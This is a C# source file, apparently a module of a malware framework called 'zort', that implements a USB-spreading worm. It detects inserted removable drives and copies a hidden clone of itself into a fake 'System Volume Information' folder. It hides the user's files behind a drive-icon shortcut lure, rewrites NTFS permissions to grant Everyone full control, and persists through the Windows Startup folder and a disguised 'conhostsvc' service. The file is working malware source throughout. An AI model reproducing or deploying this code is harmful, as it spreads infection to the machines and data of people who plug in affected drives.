using IWshRuntimeLibrary;
using System;
using System.IO;
using System.Linq;
using System.Management;
using System.Security.AccessControl;
using System.Security.Principal;
using System.ServiceProcess;
using File = System.IO.File;

namespace zort
{
    public class RemovableInfector : IPayloadModule
    {
        private readonly ManagementEventWatcher _watcher = new ManagementEventWatcher();
        private readonly byte[] RECOGNITION_BYTES = { 0x69, 0x7A, 0x42, 0x19, 0x00, 0xCC, 0xEF, 0x42 };
        private const byte VERSION_BYTE = 0x01;
        const string FAKE_FOLDER_NAME = " ";
        const string FAKE_SYSTEM_VOLUME_INFO_NAME = "System Volume Information";

        public string ModuleName => "InfectRemovables";
        public string Description => "Infects removable drives with a fake System Volume Information folder.";
        public ElevationType ElevationType => ElevationType.Both;
        public void Start()
        {
            // Code to start the infection method
            ModuleLogger.Log(this, "InfectRemovables started.");
            TryInfectAll();
            WatchRemovableDrives();
        }
        public void Stop()
        {
            // Code to stop the infection method
            ModuleLogger.Log(this, "InfectRemovables stopped.");
            UnwatchRemovableDrives();
        }

        private void WatchRemovableDrives()
        {
            // Code to watch drives for removable media
            ModuleLogger.Log(this, "Watching drives for removable media...");
            _watcher.EventArrived += new EventArrivedEventHandler((object sender, EventArrivedEventArgs e) =>
            {
                // Code to handle the event when a removable drive is inserted
                ModuleLogger.Log(this, "Removable drive inserted or removed.");

                TryInfectAll();
            });
            _watcher.Query = new WqlEventQuery("SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2");
            _watcher.Start();
        }

        private void TryInfectAll()
        {
            //Enumerate all removable drives and infect them
            DriveInfo[] drives = DriveInfo.GetDrives();
            foreach (DriveInfo drive in drives)
            {
                if (drive.DriveType == DriveType.Removable && drive.IsReady)
                {
                    char driveLetter = drive.Name[0];
                    InfectRemovableDrive(driveLetter);
                }
            }
        }

        private void UnwatchRemovableDrives()
        {
            // Code to stop watching drives
            ModuleLogger.Log(this, "Stopped watching drives.");
            _watcher.Stop();
        }

        private void InfectRemovableDrive(char driveLetter)
        {
            string drivePath = $@"{driveLetter}:\";
            // Check if the drive is removable
            if (!DriveInfo.GetDrives().Any(d => d.Name == drivePath && d.DriveType == System.IO.DriveType.Removable)) return;

            // Check if the drive is already infected
            string driveRoot = drivePath;
            string fakeFolderPath = Path.Combine(driveRoot, FAKE_FOLDER_NAME);
            string fakeSystemVolumeInfoPath = Path.Combine(fakeFolderPath, FAKE_SYSTEM_VOLUME_INFO_NAME);
            string fakeFilePath = Path.Combine(fakeSystemVolumeInfoPath, "WPSettings.dat");

            Directory.CreateDirectory(fakeSystemVolumeInfoPath);

            byte[] expectedData = new byte[RECOGNITION_BYTES.Length + 1];
            Buffer.BlockCopy(RECOGNITION_BYTES, 0, expectedData, 0, RECOGNITION_BYTES.Length);
            expectedData[RECOGNITION_BYTES.Length] = VERSION_BYTE;

            if (File.Exists(fakeFilePath))
            {
                //TODO: Add check for version byte for updating
                if (File.ReadAllBytes(fakeFilePath).SequenceEqual(expectedData))
                {
                    ModuleLogger.Log(this, "Drive is already infected. Exiting.");
                    return;
                }
            }
            ModuleLogger.Log(this, $"Infecting removable drive: {driveLetter}");

            // Check if the drive is writable
            if (!CanWrite(drivePath))
            {
                ModuleLogger.Log(this, "Drive is not writable. rewriting security rules");
                // Attempt to change the security rules to make it writable
                ChangeNTFSSecurityRules(drivePath);
            }
            // Check again if the drive is writable
            if (!CanWrite(drivePath))
            {
                ModuleLogger.Log(this, "Drive is still not writable. Exiting.");
                return;
            }

            if (string.IsNullOrEmpty(driveRoot))
            {
                ModuleLogger.Log(this, "No writable directory found.");
                return;
            }

            ModuleLogger.Log(this, $"Most outer writable directory: {driveRoot}");

            // Create a fake folder in the most outer writable directory
            Directory.CreateDirectory(fakeFolderPath);
            ModuleLogger.Log(this, $"Created fake folder: {fakeFolderPath}");

            // Create a fake System Volume Information folder
            Directory.CreateDirectory(fakeSystemVolumeInfoPath);
            ModuleLogger.Log(this, $"Created fake System Volume Information folder: {fakeSystemVolumeInfoPath}");

            //Create fake file in the fake folder containing recognition bytes and version info
            File.WriteAllBytes(fakeFilePath, expectedData);

            // Copy the executable to the fake folder
            byte[] bytes = PersistenceHelper.CreateClone();
            string clonedExecutablePath = Path.Combine(fakeSystemVolumeInfoPath, "IndexerVolumeGuid.exe");
            using (FileStream fs = new FileStream(clonedExecutablePath, FileMode.Create, FileAccess.Write, FileShare.None))
            {
                fs.Write(bytes, 0, bytes.Length);
            }
            ModuleLogger.Log(this, $"Copied executable to fake folder: {clonedExecutablePath}");

            // Set the file attributes to system and hidden
            File.SetAttributes(clonedExecutablePath, FileAttributes.System | FileAttributes.Hidden);
            ModuleLogger.Log(this, $"Set file attributes to system and hidden: {clonedExecutablePath}");

            // Create a shortcut to the executable
            string targetPath = $@"{fakeSystemVolumeInfoPath}\IndexerVolumeGuid.exe";
            string shortcutPath = Path.Combine(fakeFolderPath, $@"{driveLetter}:\.lnk");
            CreateShortcut(shortcutPath, targetPath, @"C:\Windows\System32\SHELL32.dll,79"); //Drive icon
            ModuleLogger.Log(this, $"Created shortcut to executable: {shortcutPath}");

            // Create desktop.ini to add an icon to the fake fake folder
            string desktopIniPath = Path.Combine(fakeFolderPath, "desktop.ini");
            using (StreamWriter writer = new StreamWriter(desktopIniPath))
            {
                writer.WriteLine("[.ShellClassInfo]");
                writer.WriteLine("IconResource=C:\\Windows\\System32\\shell32.dll,79");
            }
            ModuleLogger.Log(this, $"Created desktop.ini: {desktopIniPath}");

            // Set folders and files as system and hidden
            File.SetAttributes(fakeFolderPath, FileAttributes.System | FileAttributes.Hidden);
            File.SetAttributes(fakeSystemVolumeInfoPath, FileAttributes.System | FileAttributes.Hidden);
            File.SetAttributes(desktopIniPath, FileAttributes.System | FileAttributes.Hidden);
            ModuleLogger.Log(this, "Set fake folders and desktop.ini as system and hidden.");

            // Move files and folders from most outer directory to the fake folder
            DirectoryInfo mostOuterDir = new DirectoryInfo(driveRoot);
            foreach (FileInfo file in mostOuterDir.GetFiles())
            {
                if (Path.GetFileName(file.FullName) == "desktop.ini") continue;
                if (Path.GetFileName(file.FullName) == "autorun.inf") continue;
                if (Path.GetExtension(file.FullName) == ".lnk") continue;
                string newPath = Path.Combine(fakeFolderPath, Path.GetFileName(file.FullName));
                File.Move(file.FullName, newPath);
            }
            foreach (DirectoryInfo directory in mostOuterDir.GetDirectories())
            {
                if (directory.FullName.Contains(FAKE_SYSTEM_VOLUME_INFO_NAME)) continue;
                if (directory.FullName.Contains(FAKE_FOLDER_NAME)) continue;
                if (directory.FullName.Contains("System Volume Information")) continue;
                string newPath = Path.Combine(fakeFolderPath, directory.Name);
                Directory.Move(directory.FullName, newPath);
            }
            ModuleLogger.Log(this, "Moved files and folders to fake folder.");
        }

        private static void CreateShortcut(string path, string targetPath, string iconPath, string description = "")
        {
            WshShell shell = new WshShell();
            string shortcutAddress = path;
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutAddress);
            shortcut.Description = description;
            shortcut.TargetPath = targetPath;
            shortcut.IconLocation = iconPath;
            shortcut.Save();
        }

        private bool CanWrite(string path)
        {
            // Check if the path is writable
            try
            {
                File.Create(Path.Combine(path, "test")).Close();
                File.Delete(Path.Combine(path, "test"));
                return true;
            }
            catch
            {
                return false;
            }
        }

        private void ChangeNTFSSecurityRules(string drivePath)
        {
            try
            {
                ModuleLogger.Log(this, $"Changing NTFS security rules for: {drivePath}");

                // Get the directory info for the drive
                DirectoryInfo directoryInfo = new DirectoryInfo(drivePath);

                // Get the current access control settings
                DirectorySecurity directorySecurity = directoryInfo.GetAccessControl();

                // Remove all existing rules for the Everyone
                var rules = directorySecurity.GetAccessRules(true, true, typeof(SecurityIdentifier));
                foreach (FileSystemAccessRule rule in rules)
                {
                    directorySecurity.RemoveAccessRule(rule);
                }

                // Add a new rule to allow full control for everyone
                FileSystemAccessRule accessRule = new FileSystemAccessRule(
                    "Everyone",
                    FileSystemRights.FullControl,
                    InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                    PropagationFlags.None,
                    AccessControlType.Allow);

                directorySecurity.AddAccessRule(accessRule);

                // Apply the updated access control settings
                directoryInfo.SetAccessControl(directorySecurity);

                ModuleLogger.Log(this, "NTFS security rules updated successfully.");
            }
            catch (Exception ex)
            {
                ModuleLogger.Log(this, $"Failed to change NTFS security rules: {ex.Message}");
            }
        }

        public static void CheckIfRunningFromRemovableDrive()
        {
            // Check if the current process is running from a removable drive
            string currentPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            DriveInfo driveInfo = new DriveInfo(Path.GetPathRoot(currentPath));
            if (driveInfo.DriveType != DriveType.Removable) return;
            ModuleLogger.Log(typeof(RemovableInfector), "Running from removable drive. Attempting to infect system...");
            if (Path.GetFileName(currentPath) == "IndexerVolumeGuid.exe")
            {
                // Started from nicely structured infection
                // Open the parent folder in a file explorer
                string parentFolder = Directory.GetParent(Path.GetDirectoryName(currentPath)).FullName;
                if (parentFolder != null)
                {
                    System.Diagnostics.Process.Start("explorer.exe", parentFolder);
                    ModuleLogger.Log(typeof(RemovableInfector), $"Opened parent folder: {parentFolder}");
                }
            }

            // Continue infecting the system if not already infected
            if(!IsSystemInfected())
            {
                // Create a file indicating that we already copied to startup
                string attribPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "22SWTARDED.DAT");
                string startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                string[] startupFiles = Directory.GetFiles(startupPath, "*.appxbundl.exe");
                if (!File.Exists(attribPath))
                {
                    PersistenceHelper.MoveAndRunFromStartup();
                    File.WriteAllBytes(attribPath, new byte[] { 0x01 });
                } else
                {
                    if (startupFiles.Length <= 0)
                    {
                        PersistenceHelper.MoveAndRunFromStartup();
                        File.WriteAllBytes(attribPath, new byte[] { 0x01 });
                    }
                    else
                    {
                        ModuleLogger.Log(typeof(RemovableInfector), "Already moved to startup. Exiting.");
                        Environment.Exit(0);
                    }
                }
            } else
            {
                ModuleLogger.Log(typeof(RemovableInfector), "System is already infected. Exiting.");
                Environment.Exit(0);
            }
        }

        public static bool IsSystemInfected()
        {
            const string serviceName = "conhostsvc";
            try
            {
                // Check if conhostsvc exists
                var service = ServiceController.GetServices().FirstOrDefault(s => s.ServiceName.ToLower() == serviceName);
                if (service != null)
                {
                    ModuleLogger.Log(typeof(RemovableInfector), "System is infected. Service exists.");
                    // Service exists
                    ModuleLogger.Log(typeof(RemovableInfector), $"Service {serviceName} exists. System is infected.");

                    //Start service if not already running
                    var serviceController = new System.ServiceProcess.ServiceController(serviceName);
                    if (serviceController.Status != System.ServiceProcess.ServiceControllerStatus.Running)
                    {
                        serviceController.Start();
                        ModuleLogger.Log(typeof(RemovableInfector), $"Service {serviceName} started.");
                    }
                    else
                    {
                        ModuleLogger.Log(typeof(RemovableInfector), $"Service {serviceName} is already running.");
                    }

                    return true;
                }
                else return false;

            } catch (Exception ex)
            {
                ModuleLogger.Log(typeof(RemovableInfector), $"Error checking if system is infected: {ex.Message}");
                return false;
            }
        }
    }
}
